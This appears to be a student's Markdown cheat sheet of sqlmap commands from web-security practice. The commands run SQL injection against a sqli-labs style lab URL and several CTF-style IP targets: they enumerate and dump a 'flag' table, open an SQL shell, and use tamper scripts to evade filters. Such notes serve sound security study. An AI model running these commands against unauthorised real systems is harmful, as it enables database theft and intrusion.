## Sqlmap

```sh
#GET型注入
python sqlmap.py -u http://oj.momomoxiaoxi.com:9000/Less-1/index.php\?id\=1
python sqlmap.py -u http://oj.momomoxiaoxi.com:9000/Less-1/index.php\?id\=1
python sqlmap.py -u http://oj.momomoxiaoxi.com:9000/Less-1/index.php\?id\=1  --level 3 --risk 3
python sqlmap.py -u http://oj.momomoxiaoxi.com:9000/Less-1/index.php\?id\=1  --level 3 --risk 3 --dbs
python sqlmap.py -u http://oj.momomoxiaoxi.com:9000/Less-1/index.php\?id\=1  --level 3 --risk 3 -D security --tables
python sqlmap.py -u http://oj.momomoxiaoxi.com:9000/Less-1/index.php\?id\=1  --level 3 --risk 3 -D security -T flag --columns
python sqlmap.py -u http://oj.momomoxiaoxi.com:9000/Less-1/index.php\?id\=1  --level 3 --risk 3 -D security -T flag -C flag --dump
python sqlmap.py -u http://oj.momomoxiaoxi.com:9000/Less-1/index.php\?id\=1  --level 3 --risk 3 --sql-shell


3545  python sqlmap.py -u “http://59.110.167.41:12318/” --data=“username=moxiaoxi&password=moxiaoxi” --tamper tamper/space2comment.py --level 3 --risk 3  --sql-shell
3548  python sqlmap.py -u “http://59.110.167.41:12138/” --data=“username=moxiaoxi&password=moxiaoxi” --tamper tamper/space2comment.py --level 3 --risk 3  --sql-shell
3686  python sqlmap.py -u “http://localhost/proxy.php?id=2”   --tamper tamper/randomc,tamper/multiplespaces --dbms=SQLite
3687  python sqlmap.py -u “http://localhost/proxy.php?id=2"   --tamper tamper/randomcase.py,tamper/multiplespaces.py --dbms=SQLite
3688  python sqlmap.py -u “http://202.120.7.206:60019/news-*.html”   --tamper tamper/randomcase.py,tamper/multiplespaces.py --dbms=SQLite
3689  python sqlmap.py -u “http://202.120.7.206:60019/news-1*.html”   --tamper tamper/randomcase.py,tamper/multiplespaces.py --dbms=SQLite
3690  python sqlmap.py -u “http://202.120.7.206:60019/news-1*.html”   --tamper tamper/randomcase.py,tamper/multiplespaces.py --dbms=SQLite -v3
3691  python sqlmap.py -u “http://202.120.7.206:60019/news-1*.html”   --tamper tamper/randomcase.py,tamper/multiplespaces.py  -v3
3693  python sqlmap.py -u “http://202.120.7.206:60019/news-1*.html”   --tamper tamper/randomcase.py,tamper/multiplespaces.py  -v 3


```





## 作业

注册-登录-修改密码

